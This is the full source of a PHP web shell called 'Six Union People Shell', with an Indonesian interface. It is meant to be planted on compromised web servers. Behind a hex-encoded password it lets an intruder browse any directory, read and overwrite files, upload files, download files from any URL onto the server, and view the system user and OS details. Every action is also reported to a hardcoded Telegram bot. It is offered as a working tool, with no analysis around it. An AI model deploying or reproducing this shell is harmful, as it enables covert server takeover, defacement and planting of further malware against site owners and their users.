<?php
session_start();
$hex_pass = '616c616c6163696e7461';
function strToHex($string) {
    $hex = '';
    for ($i=0; $i<strlen($string); $i++) $hex .= dechex(ord($string[$i]));
    return $hex;
}
if (!isset($_SESSION['fileman_ok'])) {
    if (isset($_POST['pass']) && strToHex($_POST['pass']) === $hex_pass) {
        $_SESSION['fileman_ok'] = true;
        header("Location: ".$_SERVER['PHP_SELF']."?".http_build_query($_GET)); exit;
    }
    echo '<!DOCTYPE html><html><head><title>Login</title><style>
    body{background:#e3e6ea;font-family:sans-serif;}
    .loginbox{max-width:350px;margin:100px auto;padding:25px;background:#fff;border-radius:10px;box-shadow:0 4px 16px #0002;}
    input{font-size:1em;padding:9px 12px;width:90%;margin-top:10px;}
    button{padding:9px 20px;margin-top:20px;background:#304c89;color:#fff;border:none;border-radius:5px;font-size:1em;cursor:pointer;}
    button:hover{background:#587fc6;}
    </style></head><body>
    <div class="loginbox">
    <h2>🔒 Login Area</h2>
    <form method=post>
    <input type=password name=pass placeholder="Masukkan Password"><br>
    <button>Login</button>
    </form></div></body></html>'; exit;
}
if(isset($_GET['logout'])) { session_destroy(); header("Location: ".$_SERVER['PHP_SELF']); exit; }

$botToken = '8161188245:AAFTyqNTbegh0ruXaGrGKzH_oCPeNl4MWmg';
$chatId   = '7973648686';

function sendTG($msg){
    global $botToken, $chatId;
    $msg = urlencode($msg);
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$msg");
}

$dir = isset($_GET['d']) ? $_GET['d'] : '.';

// Info path & env
$abs_path = realpath($dir);
$server = $_SERVER['SERVER_SOFTWARE'] ?? php_sapi_name();
$os = php_uname();
$user = (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) ? posix_getpwuid(posix_geteuid())['name'] : get_current_user();
$group = (function_exists('posix_getgrgid') && function_exists('posix_getegid')) ? posix_getgrgid(posix_getegid())['name'] : '-';
$phpver = phpversion();

// Actions
if(isset($_FILES['up'])){
    move_uploaded_file($_FILES['up']['tmp_name'], "$dir/".$_FILES['up']['name']);
    sendTG("📥 [UPLOAD]\nUser: $user\nFile: ".$_FILES['up']['name']."\nPath: $abs_path");
}
if(isset($_POST['cfile']) && $_POST['fname']){
    file_put_contents("$dir/".$_POST['fname'], $_POST['fcontent']);
    sendTG("📝 [CREATE FILE]\nUser: $user\nFile: ".$_POST['fname']."\nPath: $abs_path");
}
if(isset($_POST['dlurl']) && $_POST['url'] && $_POST['fname']){
    file_put_contents("$dir/".$_POST['fname'], file_get_contents($_POST['url']));
    sendTG("🌐 [REMOTE DOWNLOAD]\nUser: $user\nFrom: ".$_POST['url']."\nTo: ".$_POST['fname']."\nPath: $abs_path");
}
if(isset($_POST['saveedit']) && $_GET['f']){
    file_put_contents("$dir/".$_GET['f'], $_POST['fileedit']);
    sendTG("✏️ [EDIT FILE]\nUser: $user\nFile: ".$_GET['f']."\nPath: $abs_path");
}

// Icon helper
function fileIcon($f, $isdir) {
    if ($isdir) return '📁';
    $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
    if (in_array($ext, ['jpg','jpeg','png','gif','bmp','webp'])) return '🖼️';
    if (in_array($ext, ['php','html','js','css'])) return '💻';
    if (in_array($ext, ['txt','md','log'])) return '📝';
    if (in_array($ext, ['zip','rar','7z','tar','gz'])) return '🗜️';
    return '📄';
}

// HTML
echo <<<HTML
<!DOCTYPE html>
<html>
<head>
<title>Six Union People Shell</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body { background: #f4f7fa; font-family: 'Segoe UI', Arial, sans-serif; color: #333; margin: 0; }
h2 { margin: 30px 0 10px 0; text-align:center; color:#304c89;}
#main { max-width: 900px; margin: 40px auto; padding: 25px; background: #fff; border-radius: 16px; box-shadow: 0 6px 20px #0002;}
table { width:100%; border-collapse:collapse; background:#fafbfc;}
th,td { padding:10px 6px; text-align:left;}
tr:nth-child(even) {background:#f1f7fa;}
a { color:#2d6cdf; text-decoration:none;}
a:hover { text-decoration:underline;}
input,button,textarea { font-size:1em; border-radius:6px; border:1px solid #ccd2dd; padding:6px; margin:2px 0;}
input[type=file] { border: none; }
button { background: #304c89; color: #fff; border:none; padding:7px 18px; cursor:pointer; transition:.2s;}
button:hover { background: #587fc6;}
form { display:inline;}
.dirnav { margin-bottom:18px; }
hr { border:0; border-top:1px solid #e3e7ee; margin:30px 0;}
@media (max-width:600px) { #main {padding:8px;} td,th{padding:7px 3px;} }
.info-block { background:#e3e8f3; border-radius:9px; padding:14px 20px; margin-bottom:25px; font-size:96%; box-shadow:0 2px 6px #0001; }
.info-block b { width:110px; display:inline-block; color:#222; }
</style>
</head>
<body>
<div id="main">
<h2>🦸‍♀️ INFORMASI SERVER YANG LAGI DI ENTOT <span style="float:right;font-size:60%;"><a href="?logout=1" style="color:#d72f2f;">Logout</a></span></h2>

<div class="info-block">
<b>Directory:</b> <span style="color:#294bd5;">{$abs_path}</span><br>
<b>Server:</b> {$server}<br>
<b>System:</b> {$os}<br>
<b>User:</b> {$user}<br>
<b>Group:</b> {$group}<br>
<b>PHP Version:</b> {$phpver}
</div>
HTML;

if ($dir!='.' && $dir!='/') echo "<a href='?d=".dirname($dir)."'>⬆️ Ke Atas</a><br><br>";

echo "<table><tr><th>Nama</th><th>Tipe</th><th>Ukuran</th><th>Aksi</th></tr>";
foreach(scandir($dir) as $f) {
    if($f=='.') continue;
    $path = "$dir/$f";
    $isdir = is_dir($path);
    echo "<tr>
        <td>".fileIcon($f, $isdir)." ";
    if($isdir)
        echo "<a href='?d=$path'>$f</a>";
    else
        echo "<a href='?d=$dir&f=$f'>$f</a>";
    echo "</td>
        <td>".($isdir?"Folder":"File")."</td>
        <td>".($isdir?"-":filesize($path)." B")."</td>
        <td>";
    if(!$isdir) echo "<a href='?d=$dir&f=$f'>Lihat/Edit</a> ";
    echo "</td></tr>";
}
echo "</table>";

if(isset($_GET['f']) && is_file("$dir/".$_GET['f'])) {
    $file = "$dir/".$_GET['f'];
    $content = htmlspecialchars(file_get_contents($file));
    echo "<hr><h3>✏️ Edit File: <b>".$_GET['f']."</b></h3>
    <form method=post>
    <textarea name='fileedit' rows=12 style='width:100%'>$content</textarea><br>
    <button name=saveedit>Simpan Perubahan</button>
    </form>";
}

echo "<hr><h3>⬆️ Upload File</h3>
<form method=post enctype=multipart/form-data>
<input type=file name=up required>
<button>Upload</button>
</form>";

echo "<hr><h3>📝 Buat File Baru</h3>
<form method=post>
<input name=fname placeholder='nama_file.txt' required><br>
<textarea name=fcontent placeholder='Isi file...' rows=6 style='width:100%'></textarea><br>
<button name=cfile>Buat File</button>
</form>";

echo "<hr><h3>🌐 Download dari URL (Remote Upload)</h3>
<form method=post>
<input name=url placeholder='https://domain.com/file.txt' required style='width:70%'>
<input name=fname placeholder='nama_simpan.txt' required style='width:28%'><br>
<button name=dlurl>Download & Simpan</button>
</form>";

echo "<br><hr style='margin-top:30px;'><div style='font-size:90%;color:#888;text-align:center;'>Janda Team &copy; ".date('Y')."</div>";
echo "</div></body></html>";
?>
